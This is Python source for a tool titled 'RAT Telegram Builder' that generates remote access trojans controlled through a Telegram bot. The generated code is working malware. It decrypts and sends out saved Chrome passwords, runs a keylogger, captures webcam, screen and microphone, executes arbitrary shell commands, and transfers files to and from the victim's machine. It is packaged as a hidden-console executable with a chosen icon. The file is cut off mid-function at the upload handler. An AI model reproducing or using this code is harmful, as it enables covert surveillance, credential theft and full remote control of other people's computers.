# ============================================
# RAT TELEGRAM BUILDER v1.4 
# Autor: LIMAX DEV
# ============================================

import subprocess
import sys
import os
import time
import shutil  # Import adicionado
import threading
from datetime import datetime

# Verificar e instalar dependências primeiro
required_packages = [
    "customtkinter",
    "pyTelegramBotAPI",
    "pyautogui",
    "opencv-python",
    "pyttsx3",
    "pynput",
    "pycryptodome",
    "pywin32",
    "numpy",
    "sounddevice",
    "soundfile",
    "psutil",
    "requests"
]

print("🔧 Verificando dependências...")
for package in required_packages:
    try:
        if package == "pyTelegramBotAPI":
            __import__("telebot")
        elif package == "opencv-python":
            __import__("cv2")
        elif package == "pycryptodome":
            __import__("Cryptodome")
        elif package == "pywin32":
            __import__("win32crypt")
        else:
            __import__(package.replace("-", "_"))
        print(f"✅ {package} já instalado")
    except ImportError:
        print(f"📦 Instalando {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
        print(f"✅ {package} instalado")

# Agora importa os módulos após instalação
import customtkinter as ctk
from tkinter import filedialog, messagebox
import telebot

class RATBuilder:
    def __init__(self):
        self.version = "1.4"
        self.author = "LIMAX DEV"
        
        # Configuração de cores moderna
        self.colors = {
            "background": "#0a0a0a",
            "dark_gray": "#1a1a1a",
            "gray": "#2a2a2a",
            "light_gray": "#3a3a3a",
            "red": "#ff0033",
            "dark_red": "#cc0029",
            "green": "#00ff88",
            "blue": "#0099ff",
            "white": "#ffffff"
        }
        
        # Configurações do builder
        self.token = ""
        self.output_name = "RAT_Telegram"
        self.icon_path = ""
        self.build_type = "Python"
        self.chat_id = ""
        
        # Opções do RAT
        self.options = {
            # Comandos Básicos
            "start": {"status": "enable", "desc": "Iniciar conexão", "category": "basic"},
            "help": {"status": "disable", "desc": "Mostrar ajuda", "category": "basic"},
            "addstartup": {"status": "disable", "desc": "Adicionar à inicialização", "category": "basic"},
            "deletestartup": {"status": "disable", "desc": "Remover da inicialização", "category": "basic"},
            "keylogger": {"status": "disable", "desc": "Iniciar keylogger", "category": "basic"},
            "stopkeylogger": {"status": "disable", "desc": "Parar keylogger", "category": "basic"},
            "run": {"status": "disable", "desc": "Executar arquivo", "category": "basic"},
            "users": {"status": "disable", "desc": "Listar usuários", "category": "basic"},
            "whoami": {"status": "disable", "desc": "Usuário atual", "category": "basic"},
            "tasklist": {"status": "disable", "desc": "Listar processos", "category": "basic"},
            "taskkill": {"status": "disable", "desc": "Matar processo", "category": "basic"},
            "sleep": {"status": "disable", "desc": "Suspender PC", "category": "basic"},
            "shutdown": {"status": "disable", "desc": "Desligar PC", "category": "basic"},
            "restart": {"status": "disable", "desc": "Reiniciar PC", "category": "basic"},
            "altf4": {"status": "disable", "desc": "Fechar janela ativa", "category": "basic"},
            "cmdbomb": {"status": "disable", "desc": "Abrir múltiplos CMD", "category": "basic"},
            "msg": {"status": "disable", "desc": "Mostrar mensagem", "category": "basic"},
            
            # Segurança
            "passwords": {"status": "disable", "desc": "Extrair senhas Chrome", "category": "security"},
            "wallpaper": {"status": "disable", "desc": "Alterar wallpaper", "category": "security"},
            "disabletaskmgr": {"status": "disable", "desc": "Desabilitar taskmgr", "category": "security"},
            "enabletaskmgr": {"status": "disable", "desc": "Habilitar taskmgr", "category": "security"},
            "winblocker": {"status": "disable", "desc": "Bloquear tela", "category": "security"},
            "winblocker2": {"status": "disable", "desc": "Bloqueio avançado", "category": "security"},
            
            # Controle do Dispositivo
            "screenshot": {"status": "disable", "desc": "Capturar tela", "category": "device"},
            "webscreen": {"status": "disable", "desc": "Foto da webcam", "category": "device"},
            "webcam": {"status": "disable", "desc": "Video da webcam", "category": "device"},
            "screenrecord": {"status": "disable", "desc": "Gravar tela", "category": "device"},
            "block": {"status": "disable", "desc": "Bloquear mouse", "category": "device"},
            "unblock": {"status": "disable", "desc": "Desbloquear mouse", "category": "device"},
            "mousemesstart": {"status": "disable", "desc": "Iniciar bagunça mouse", "category": "device"},
            "mousemesstop": {"status": "disable", "desc": "Parar bagunça mouse", "category": "device"},
            "mousekill": {"status": "disable", "desc": "Matar processos do mouse", "category": "device"},
            "mousestop": {"status": "disable", "desc": "Parar movimentos", "category": "device"},
            "mousemove": {"status": "disable", "desc": "Mover mouse", "category": "device"},
            "mouseclick": {"status": "disable", "desc": "Clicar mouse", "category": "device"},
            "mouseright": {"status": "disable", "desc": "Clique direito", "category": "device"},
            "fullvolume": {"status": "disable", "desc": "Volume máximo", "category": "device"},
            "volumeplus": {"status": "disable", "desc": "Aumentar volume", "category": "device"},
            "volumeminus": {"status": "disable", "desc": "Diminuir volume", "category": "device"},
            "maximize": {"status": "disable", "desc": "Maximizar janelas", "category": "device"},
            "minimize": {"status": "disable", "desc": "Minimizar janelas", "category": "device"},
            
            # Rede
            "wifilist": {"status": "disable", "desc": "Listar redes WiFi", "category": "network"},
            "wifipass": {"status": "disable", "desc": "Senhas WiFi", "category": "network"},
            "chrome": {"status": "disable", "desc": "Dados Chrome", "category": "network"},
            "edge": {"status": "disable", "desc": "Dados Edge", "category": "network"},
            "firefox": {"status": "disable", "desc": "Dados Firefox", "category": "network"},
            
            # Multimídia
            "textspech": {"status": "disable", "desc": "Falar texto", "category": "media"},
            "playsound": {"status": "disable", "desc": "Tocar som", "category": "media"},
            "download": {"status": "disable", "desc": "Baixar arquivo", "category": "media"},
            "upload": {"status": "disable", "desc": "Enviar arquivo", "category": "media"},
            "clipboard": {"status": "disable", "desc": "Ler clipboard", "category": "media"},
            "changeclipboard": {"status": "disable", "desc": "Alterar clipboard", "category": "media"},
            "mic": {"status": "disable", "desc": "Gravar microfone", "category": "media"},
            
            # Avançado
            "e": {"status": "disable", "desc": "Executar comando", "category": "advanced"},
            "ex": {"status": "disable", "desc": "Executar comando oculto", "category": "advanced"},
            "execute": {"status": "disable", "desc": "Executar script", "category": "advanced"},
            "metadata": {"status": "disable", "desc": "Metadados arquivos", "category": "advanced"},
            "keytype": {"status": "disable", "desc": "Digitar texto", "category": "advanced"},
            "keypress": {"status": "disable", "desc": "Pressionar tecla", "category": "advanced"},
            "keypresstwo": {"status": "disable", "desc": "Duas teclas", "category": "advanced"},
            "keypressthree": {"status": "disable", "desc": "Três teclas", "category": "advanced"},
            "hide": {"status": "disable", "desc": "Ocultar janela", "category": "advanced"},
            "unhide": {"status": "disable", "desc": "Mostrar janela", "category": "advanced"},
            
            # Informações
            "info": {"status": "disable", "desc": "Info completa PC", "category": "info"},
            "pcinfo": {"status": "disable", "desc": "Info hardware", "category": "info"},
            "shortinfo": {"status": "disable", "desc": "Info resumida", "category": "info"},
            "apps": {"status": "disable", "desc": "Apps instalados", "category": "info"},
            "batteryinfo": {"status": "disable", "desc": "Info bateria", "category": "info"},
            
            # Exemplos
            "examples": {"status": "disable", "desc": "Exemplos de uso", "category": "examples"},
            "github": {"status": "disable", "desc": "Link GitHub", "category": "examples"}
        }
        
        self.setup_ui()
    
    def setup_ui(self):
        """Configura a interface gráfica"""
        ctk.set_appearance_mode("dark")
        self.builder = ctk.CTk()
        self.builder.title(f"RAT Builder v{self.version} - LIMAX DEV")
        self.builder.geometry("1200x1000")
        self.builder.resizable(False, False)
        self.builder.configure(fg_color=self.colors["background"])
        
        # Título
        title_frame = ctk.CTkFrame(self.builder, fg_color=self.colors["dark_gray"], height=80)
        title_frame.pack(pady=10, padx=10, fill="x")
        title_frame.pack_propagate(False)
        
        title = ctk.CTkLabel(title_frame, text="🐀 RAT TELEGRAM BUILDER", 
                            font=ctk.CTkFont(size=28, weight="bold"),
                            text_color=self.colors["red"])
        title.pack(pady=20)
        
        # Configurações
        config_frame = ctk.CTkFrame(self.builder, fg_color=self.colors["dark_gray"])
        config_frame.pack(pady=5, padx=10, fill="x")
        
        # Token
        ctk.CTkLabel(config_frame, text="Token do Bot:", 
                    font=ctk.CTkFont(size=12)).grid(row=0, column=0, padx=10, pady=10, sticky="w")
        self.token_entry = ctk.CTkEntry(config_frame, width=350, height=35,
                                       placeholder_text="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz",
                                       fg_color=self.colors["gray"])
        self.token_entry.grid(row=0, column=1, padx=10, pady=10)
        
        # Chat ID para teste
        ctk.CTkLabel(config_frame, text="Chat ID (opcional):", 
                    font=ctk.CTkFont(size=12)).grid(row=0, column=2, padx=10, pady=10, sticky="w")
        self.chatid_entry = ctk.CTkEntry(config_frame, width=150, height=35,
                                        placeholder_text="123456789",
                                        fg_color=self.colors["gray"])
        self.chatid_entry.grid(row=0, column=3, padx=10, pady=10)
        
        # Nome do arquivo
        ctk.CTkLabel(config_frame, text="Nome do Arquivo:", 
                    font=ctk.CTkFont(size=12)).grid(row=1, column=0, padx=10, pady=10, sticky="w")
        self.name_entry = ctk.CTkEntry(config_frame, width=200, height=35,
                                      placeholder_text="MeuRAT",
                                      fg_color=self.colors["gray"])
        self.name_entry.grid(row=1, column=1, padx=10, pady=10, sticky="w")
        
        # Tipo de build
        ctk.CTkLabel(config_frame, text="Tipo:", 
                    font=ctk.CTkFont(size=12)).grid(row=1, column=2, padx=10, pady=10, sticky="w")
        self.build_type_var = ctk.StringVar(value="Python")
        build_menu = ctk.CTkOptionMenu(config_frame, values=["Python", "EXE"], 
                                      variable=self.build_type_var,
                                      fg_color=self.colors["gray"],
                                      button_color=self.colors["red"])
        build_menu.grid(row=1, column=3, padx=10, pady=10, sticky="w")
        
        # Botão de ícone
        self.icon_btn = ctk.CTkButton(config_frame, text="Selecionar Ícone",
                                     command=self.select_icon,
                                     fg_color=self.colors["gray"],
                                     hover_color=self.colors["light_gray"],
                                     width=120, height=35)
        self.icon_btn.grid(row=1, column=4, padx=10, pady=10)
        
        # Botão de teste
        test_btn = ctk.CTkButton(config_frame, text="Testar Conexão",
                                command=self.test_connection,
                                fg_color=self.colors["blue"],
                                hover_color="#0066cc",
                                width=120, height=35)
        test_btn.grid(row=0, column=4, padx=10, pady=10)
        
        # Frame principal com scroll
        main_frame = ctk.CTkScrollableFrame(self.builder, width=1180, height=600,
                                           fg_color=self.colors["dark_gray"])
        main_frame.pack(pady=10, padx=10, fill="both", expand=True)
        
        # Categorias
        categories = {
            "basic": "🛠️ COMANDOS BÁSICOS",
            "security": "🔒 SEGURANÇA",
            "device": "📱 CONTROLE DO DISPOSITIVO",
            "network": "🌐 REDE",
            "media": "🎵 MULTIMÍDIA",
            "advanced": "⚡ AVANÇADO",
            "info": "ℹ️ INFORMAÇÕES",
            "examples": "📋 EXEMPLOS"
        }
        
        # Checkboxes
        self.checkboxes = {}
        row = 0
        
        for category_id, category_name in categories.items():
            # Título da categoria
            cat_label = ctk.CTkLabel(main_frame, text=category_name,
                                    font=ctk.CTkFont(size=16, weight="bold"),
                                    text_color=self.colors["green"])
            cat_label.grid(row=row, column=0, columnspan=4, padx=20, pady=(15, 5), sticky="w")
            row += 1
            
            # Botões da categoria
            btn_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
            btn_frame.grid(row=row, column=0, columnspan=4, padx=20, pady=5, sticky="w")
            
            select_all = ctk.CTkButton(btn_frame, text="✓ Selecionar Todos",
                                      command=lambda cat=category_id: self.select_category(cat, True),
                                      fg_color=self.colors["gray"],
                                      hover_color=self.colors["light_gray"],
                                      width=120, height=25)
            select_all.pack(side="left", padx=5)
            
            deselect_all = ctk.CTkButton(btn_frame, text="✗ Desmarcar Todos",
                                        command=lambda cat=category_id: self.select_category(cat, False),
                                        fg_color=self.colors["gray"],
                                        hover_color=self.colors["light_gray"],
                                        width=120, height=25)
            deselect_all.pack(side="left", padx=5)
            row += 1
            
            # Comandos da categoria
            col = 0
            cmd_count = 0
            for cmd_id, cmd_info in self.options.items():
                if cmd_info["category"] == category_id:
                    var = ctk.StringVar(value=cmd_info["status"])
                    
                    # Start sempre ativo
                    if cmd_id == "start":
                        var.set("enable")
                    
                    cb = ctk.CTkCheckBox(main_frame, 
                                        text=f"/{cmd_id} - {cmd_info['desc']}",
                                        variable=var,
                                        onvalue="enable",
                                        offvalue="disable",
                                        fg_color=self.colors["red"],
                                        hover_color=self.colors["dark_red"],
                                        border_color=self.colors["red"],
                                        text_color=self.colors["white"],
                                        width=250)
                    
                    cb.grid(row=row, column=col, padx=10, pady=2, sticky="w")
                    self.checkboxes[cmd_id] = var
                    
                    col += 1
                    cmd_count += 1
                    if col >= 4 and cmd_count % 4 == 0:
                        col = 0
                        row += 1
            
            if col != 0:
                row += 1
        
        # Botões principais
        btn_frame = ctk.CTkFrame(self.builder, fg_color=self.colors["dark_gray"], height=80)
        btn_frame.pack(pady=10, padx=10, fill="x")
        btn_frame.pack_propagate(False)
        
        build_btn = ctk.CTkButton(btn_frame, text="🚀 CONSTRUIR RAT",
                                 command=self.build_rat,
                                 font=ctk.CTkFont(size=16, weight="bold"),
                                 fg_color=self.colors["red"],
                                 hover_color=self.colors["dark_red"],
                                 width=200, height=50)
        build_btn.pack(pady=15)
        
        self.status_label = ctk.CTkLabel(btn_frame, text="Pronto para construir...",
                                        font=ctk.CTkFont(size=12),
                                        text_color=self.colors["white"])
        self.status_label.pack()
    
    def select_icon(self):
        """Seleciona ícone para o executável"""
        filename = filedialog.askopenfilename(
            title="Selecionar Ícone",
            filetypes=[("Arquivos de ícone", "*.ico")]
        )
        if filename:
            self.icon_path = filename
            self.icon_btn.configure(text="Ícone Selecionado ✓",
                                  fg_color=self.colors["green"])
    
    def select_category(self, category, enable):
        """Seleciona ou desmarca todos os comandos de uma categoria"""
        for cmd_id, cmd_info in self.options.items():
            if cmd_info["category"] == category and cmd_id != "start":
                if cmd_id in self.checkboxes:
                    self.checkboxes[cmd_id].set("enable" if enable else "disable")
    
    def test_connection(self):
        """Testa a conexão com o bot Telegram"""
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showerror("Erro", "Digite o token do bot!")
            return
        
        try:
            self.status_label.configure(text="Testando conexão...", text_color=self.colors["blue"])
            self.builder.update()
            
            # Teste em thread separada para não travar a UI
            def test():
                try:
                    bot = telebot.TeleBot(token)
                    bot.get_me()  # Testa se o token é válido
                    
                    chat_id = self.chatid_entry.get().strip()
                    if chat_id:
                        try:
                            bot.send_message(chat_id, "✅ Teste de conexão bem sucedido!")
                            self.status_label.configure(text="✅ Conexão OK! Mensagem enviada!", 
                                                      text_color=self.colors["green"])
                        except:
                            self.status_label.configure(text="⚠️ Token OK, mas chat ID inválido", 
                                                      text_color="orange")
                    else:
                        self.status_label.configure(text="✅ Token válido! (adicione chat ID para teste)", 
                                                  text_color=self.colors["green"])
                    
                except Exception as e:
                    self.status_label.configure(text=f"❌ Erro: {str(e)}", text_color=self.colors["red"])
            
            threading.Thread(target=test, daemon=True).start()
            
        except Exception as e:
            self.status_label.configure(text=f"❌ Erro: {str(e)}", text_color=self.colors["red"])
    
    def build_rat(self):
        """Constrói o RAT"""
        # Validar token
        self.token = self.token_entry.get().strip()
        if not self.token:
            messagebox.showerror("Erro", "Digite o token do bot Telegram!")
            return
        
        # Coletar configurações
        self.output_name = self.name_entry.get().strip() or "RAT_Telegram"
        self.build_type = self.build_type_var.get()
        self.chat_id = self.chatid_entry.get().strip()
        
        # Atualizar status dos comandos
        for cmd_id, var in self.checkboxes.items():
            if cmd_id in self.options:
                self.options[cmd_id]["status"] = var.get()
        
        # Contar comandos ativos
        enabled = sum(1 for cmd in self.options.values() if cmd["status"] == "enable")
        
        # Confirmar
        confirm = messagebox.askyesno(
            "Confirmar",
            f"Token: {self.token[:20]}...\n"
            f"Arquivo: {self.output_name}\n"
            f"Tipo: {self.build_type}\n"
            f"Comandos: {enabled}/65\n\n"
            "Continuar?"
        )
        
        if not confirm:
            return
        
        # Construir
        self.status_label.configure(text="Construindo RAT...", text_color=self.colors["green"])
        self.builder.update()
        
        try:
            # Gerar código
            code = self.generate_code()
            
            # Salvar Python
            py_file = f"{self.output_name}.py"
            with open(py_file, "w", encoding="utf-8") as f:
                f.write(code)
            
            self.status_label.configure(text=f"✅ Arquivo Python criado: {py_file}", 
                                      text_color=self.colors["green"])
            
            # Converter para EXE se necessário
            if self.build_type == "EXE":
                self.status_label.configure(text="Convertendo para EXE...", 
                                          text_color=self.colors["green"])
                self.builder.update()
                self.convert_to_exe(py_file)
            
            self.status_label.configure(text="✅ RAT construído com sucesso!", 
                                      text_color=self.colors["green"])
            messagebox.showinfo("Sucesso", f"RAT criado: {self.output_name}.{self.build_type.lower()}")
            
        except Exception as e:
            self.status_label.configure(text=f"❌ Erro: {str(e)}", text_color=self.colors["red"])
            messagebox.showerror("Erro", str(e))
    
    def convert_to_exe(self, py_file):
        """Converte Python para EXE"""
        try:
            # Instalar pyinstaller se necessário
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                         check=True, capture_output=True)
            
            # Comando base
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--name", self.output_name,
                py_file
            ]
            
            # Adicionar imports ocultos
            hidden_imports = [
                "telebot", "pyautogui", "cv2", "pyttsx3", "pynput",
                "Cryptodome", "win32crypt", "sounddevice", "soundfile",
                "requests", "psutil", "numpy"
            ]
            for imp in hidden_imports:
                cmd.extend(["--hidden-import", imp])
            
            # Adicionar ícone
            if self.icon_path and os.path.exists(self.icon_path):
                cmd.extend(["--icon", self.icon_path])
            
            # Executar
            subprocess.run(cmd, check=True, capture_output=True)
            
            # Limpar
            for item in ["build", "dist", f"{self.output_name}.spec"]:
                if os.path.isfile(item):
                    os.remove(item)
                elif os.path.isdir(item):
                    shutil.rmtree(item)  # shutil já importado globalmente
            
            # Mover EXE
            exe_path = os.path.join("dist", f"{self.output_name}.exe")
            if os.path.exists(exe_path):
                shutil.move(exe_path, ".")
            
        except subprocess.CalledProcessError as e:
            raise Exception(f"Erro ao criar EXE: {e.stderr.decode() if e.stderr else str(e)}")
    
    def generate_code(self):
        """Gera o código Python do RAT"""
        
        # Template base
        code = '''# ============================================
# RAT TELEGRAM - Gerado pelo Builder v1.4
# Autor: LIMAX DEV
# ============================================

import telebot
import os
import sys
import time
import subprocess
import threading
import json
import base64
import ctypes
import socket
import requests
import shutil  # Import adicionado
from datetime import datetime

'''
        
        # Imports condicionais
        if self.options["screenshot"]["status"] == "enable" or self.options["screenrecord"]["status"] == "enable":
            code += "import pyautogui\n"
        if self.options["webcam"]["status"] == "enable" or self.options["webscreen"]["status"] == "enable":
            code += "import cv2\n"
        if self.options["keylogger"]["status"] == "enable":
            code += "from pynput import keyboard\n"
        if self.options["textspech"]["status"] == "enable":
            code += "import pyttsx3\n"
        if self.options["passwords"]["status"] == "enable":
            code += "import sqlite3\n"
            code += "import win32crypt\n"
            code += "from Cryptodome.Cipher import AES\n"
        if self.options["mic"]["status"] == "enable":
            code += "import sounddevice as sd\n"
            code += "import soundfile as sf\n"
            code += "import numpy as np\n"
        if any(self.options[cmd]["status"] == "enable" for cmd in ["block", "unblock", "mousemove", "mouseclick"]):
            code += "import pyautogui\n"
        
        code += f'''
# Configuração do bot
TOKEN = '{self.token}'
bot = telebot.TeleBot(TOKEN)

# Variáveis globais
keylogger_running = False
current_keys = []
mouse_mess_active = False
mouse_blocked = False
user_state = {{}}
current_dir = os.getcwd()
CHAT_ID = '{self.chat_id}' if '{self.chat_id}' else None

# Flag para controle de polling
polling_active = True

'''
        
        # Funções auxiliares
        if self.options["passwords"]["status"] == "enable":
            code += '''
def get_chrome_key():
    try:
        local_state = os.path.join(os.environ['USERPROFILE'], 
                                   'AppData', 'Local', 'Google', 'Chrome', 
                                   'User Data', 'Local State')
        with open(local_state, 'r', encoding='utf-8') as f:
            local_state_data = json.load(f)
        key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_chrome_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
        except:
            return "[Erro ao descriptografar]"
'''
        
        # Keylogger functions
        if self.options["keylogger"]["status"] == "enable":
            code += '''
def on_press(key):
    global current_keys
    try:
        current_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            current_keys.append(' ')
        elif key == keyboard.Key.enter:
            current_keys.append('\\n')
        elif key == keyboard.Key.tab:
            current_keys.append('\\t')
        elif key == keyboard.Key.backspace:
            if current_keys:
                current_keys.pop()
        else:
            current_keys.append(f'[{str(key)}]')

def start_keylogger():
    global keylogger_running
    with keyboard.Listener(on_press=on_press) as listener:
        keylogger_running = True
        listener.join()

def save_keylog():
    global current_keys
    if current_keys:
        log = ''.join(current_keys)
        filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(log)
        current_keys = []
        return filename
    return None
'''
        
        # Mouse mess functions
        if self.options["mousemesstart"]["status"] == "enable":
            code += '''
def mouse_mess():
    global mouse_mess_active
    import pyautogui
    import random
    screen_width, screen_height = pyautogui.size()
    while mouse_mess_active:
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y, duration=0.1)
        time.sleep(0.05)
'''
        
        # Comando /start (sempre ativo)
        code += '''
@bot.message_handler(commands=['start'])
def cmd_start(message):
    chat_id = message.chat.id
    user = message.from_user
    try:
        whoami = subprocess.check_output('whoami', shell=True, text=True).strip()
    except:
        whoami = "Desconhecido"
    
    welcome = f"✅ RAT Conectado!\\n\\n"
    welcome += f"👤 Usuário: {whoami}\\n"
    welcome += f"💻 PC: {socket.gethostname()}\\n"
    welcome += f"📁 Diretório: {os.getcwd()}\\n"
    welcome += f"🕒 {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\\n\\n"
    welcome += "📋 Use /help para comandos"
    
    bot.send_message(chat_id, welcome)
'''
        
        # Comando /help
        if self.options["help"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['help'])
def cmd_help(message):
    help_text = "📚 COMANDOS DISPONÍVEIS\\n\\n"
    
    help_text += "🛠️ BÁSICOS\\n"
    help_text += "/whoami - Usuário atual\\n"
    help_text += "/users - Listar usuários\\n"
    help_text += "/tasklist - Processos ativos\\n"
    help_text += "/shutdown - Desligar PC\\n"
    help_text += "/restart - Reiniciar PC\\n"
    help_text += "/sleep - Suspender\\n\\n"
    
    help_text += "📷 CAPTURA\\n"
    help_text += "/screenshot - Print da tela\\n"
    help_text += "/webcam - Foto da webcam\\n"
    help_text += "/screenrecord - Gravar tela\\n"
    help_text += "/mic - Gravar áudio (30s)\\n\\n"
    
    help_text += "🔐 SENHAS\\n"
    help_text += "/passwords - Extrair senhas Chrome\\n"
    help_text += "/keylogger - Iniciar keylogger\\n"
    help_text += "/stopkeylogger - Parar keylogger\\n\\n"
    
    help_text += "🖱️ CONTROLE\\n"
    help_text += "/mousemove [x] [y] - Mover mouse\\n"
    help_text += "/click - Clicar\\n"
    help_text += "/keytype [texto] - Digitar\\n"
    help_text += "/block - Bloquear mouse\\n"
    help_text += "/unblock - Desbloquear\\n\\n"
    
    help_text += "📁 ARQUIVOS\\n"
    help_text += "/e [comando] - Executar cmd\\n"
    help_text += "/download [caminho] - Baixar\\n"
    help_text += "/upload - Enviar arquivo\\n"
    help_text += "/cd [pasta] - Mudar diretório\\n"
    
    bot.send_message(message.chat.id, help_text)
'''
        
        # Comando /whoami
        if self.options["whoami"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['whoami'])
def cmd_whoami(message):
    try:
        user = subprocess.check_output('whoami', shell=True, text=True).strip()
        bot.send_message(message.chat.id, f"👤 {user}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Comando /screenshot
        if self.options["screenshot"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['screenshot'])
def cmd_screenshot(message):
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        filename = f"screenshot_{int(time.time())}.png"
        screenshot.save(filename)
        with open(filename, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(filename)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Comando /webcam
        if self.options["webcam"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['webcam'])
def cmd_webcam(message):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            filename = f"webcam_{int(time.time())}.jpg"
            cv2.imwrite(filename, frame)
            with open(filename, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(filename)
        cap.release()
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Comando /mic
        if self.options["mic"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['mic'])
def cmd_mic(message):
    try:
        # Verificar duração
        parts = message.text.split()
        duration = 10  # padrão
        if len(parts) > 1:
            try:
                duration = min(int(parts[1]), 60)  # máximo 60 segundos
            except:
                pass
        
        bot.send_message(message.chat.id, f"🎤 Gravando por {duration} segundos...")
        
        # Configurações de áudio
        samplerate = 44100
        channels = 2
        
        # Gravar
        recording = sd.rec(int(duration * samplerate), 
                          samplerate=samplerate, 
                          channels=channels, 
                          dtype='float32')
        sd.wait()
        
        # Salvar
        filename = f"audio_{int(time.time())}.wav"
        sf.write(filename, recording, samplerate)
        
        # Enviar
        with open(filename, 'rb') as audio:
            bot.send_audio(message.chat.id, audio, 
                          caption=f"🎤 Gravação de {duration}s")
        
        os.remove(filename)
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Comando /passwords
        if self.options["passwords"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['passwords'])
def cmd_passwords(message):
    bot.send_message(message.chat.id, "🔍 Buscando senhas...")
    
    try:
        key = get_chrome_key()
        if not key:
            bot.send_message(message.chat.id, "❌ Não foi possível obter a chave")
            return
        
        db_path = os.path.join(os.environ['USERPROFILE'], 
                               'AppData', 'Local', 'Google', 'Chrome', 
                               'User Data', 'Default', 'Login Data')
        
        if not os.path.exists(db_path):
            bot.send_message(message.chat.id, "❌ Banco de dados não encontrado")
            return
        
        # Copiar banco
        temp_db = "temp_chrome.db"
        shutil.copyfile(db_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        
        passwords = []
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_pass = row[2]
            
            if username or encrypted_pass:
                password = decrypt_chrome_password(encrypted_pass, key)
                passwords.append(f"🌐 {url}\\n👤 {username}\\n🔑 {password}\\n{'-'*30}")
        
        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        if passwords:
            result = "\\n\\n".join(passwords)
            if len(result) > 4000:
                filename = f"passwords_{int(time.time())}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(result)
                with open(filename, 'rb') as f:
                    bot.send_document(message.chat.id, f)
                os.remove(filename)
            else:
                bot.send_message(message.chat.id, f"🔐 Senhas encontradas:\\n\\n{result}")
        else:
            bot.send_message(message.chat.id, "ℹ️ Nenhuma senha encontrada")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Comando /keylogger
        if self.options["keylogger"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['keylogger'])
def cmd_keylogger(message):
    global keylogger_running
    if not keylogger_running:
        thread = threading.Thread(target=start_keylogger, daemon=True)
        thread.start()
        bot.send_message(message.chat.id, "✅ Keylogger iniciado")
    else:
        bot.send_message(message.chat.id, "⚠️ Keylogger já está ativo")

@bot.message_handler(commands=['stopkeylogger'])
def cmd_stopkeylogger(message):
    global keylogger_running
    keylogger_running = False
    filename = save_keylog()
    if filename:
        with open(filename, 'rb') as f:
            bot.send_document(message.chat.id, f)
        os.remove(filename)
    bot.send_message(message.chat.id, "✅ Keylogger parado")
'''
        
        # Comando /e
        if self.options["e"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['e'])
def cmd_execute(message):
    try:
        cmd = message.text.split('/e', 1)[1].strip()
        if not cmd:
            bot.send_message(message.chat.id, "❌ Digite um comando")
            return
        
        if cmd.startswith('cd '):
            try:
                path = cmd[3:].strip()
                os.chdir(path)
                bot.send_message(message.chat.id, f"📁 Diretório: {os.getcwd()}")
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Erro: {e}")
        else:
            result = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT)
            if len(result) > 4000:
                result = result[:4000] + "..."
            bot.send_message(message.chat.id, f"💻 {result}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Comando /download
        if self.options["download"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['download'])
def cmd_download(message):
    try:
        path = message.text.split('/download', 1)[1].strip()
        if os.path.exists(path):
            with open(path, 'rb') as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.send_message(message.chat.id, f"❌ Arquivo não encontrado: {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Upload handler
        if self.options["upload"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['upload'])
def cmd_upload(message):
    user_state[message.chat.id] = 'waiting_upload'
    bot.send_message(message.chat.id, "📤 Envie o arquivo agora")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if user_state.get(message.chat.id) == 'waiting_upload':
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            filename = message.document.file_name
            with open(filename, 'wb') as f:
                f.write(downloaded_file)
            
            bot.send_message(message.chat.id, f"✅ Arquivo salvo: {filename}")
            user_state[message.chat.id] = None
        except Exception as e:
